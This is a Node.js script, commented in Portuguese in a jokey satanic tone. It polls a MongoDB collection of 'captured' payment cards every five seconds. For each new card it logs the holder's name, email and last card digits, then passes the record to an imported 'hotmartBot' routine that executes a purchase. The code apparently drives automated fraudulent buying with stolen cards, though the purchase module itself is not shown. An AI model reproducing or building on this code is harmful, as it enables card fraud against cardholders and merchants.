// 🧬 bot.js - Executor profano
require('dotenv').config();
const mongoose = require('mongoose');
const Cartao = require('./models/Cartao');
const executarCompra = require('./services/hotmartBot');

let ultimoId = null;

(async () => {
  try {
    // Conecta no banco maldito
    await mongoose.connect(process.env.MONGODB_URI);
    console.log('🔌 Mongo conectado. Iniciando scanner satânico...\n');

    setInterval(async () => {
      try {
        const novo = await Cartao.findOne().sort({ dataCaptura: -1 });

        if (!novo) return;

        if (novo._id.toString() !== ultimoId) {
          ultimoId = novo._id.toString();

          console.log('\n🩸 NOVO CARTÃO DETECTADO 🩸');
          console.log(`👤 Nome: ${novo.nome}`);
          console.log(`📧 Email: ${novo.email}`);
          console.log(`💳 Cartão: **** **** **** ${novo.numero.slice(-4)}\n`);

          await executarCompra(novo);
        }
      } catch (err) {
        console.error('☠️ Erro durante o ritual:', err.message);
      }
    }, 5000); // a cada 5 segundos
  } catch (err) {
    console.error('❌ Falha na conexão com MongoDB:', err.message);
    process.exit(1);
  }
})();
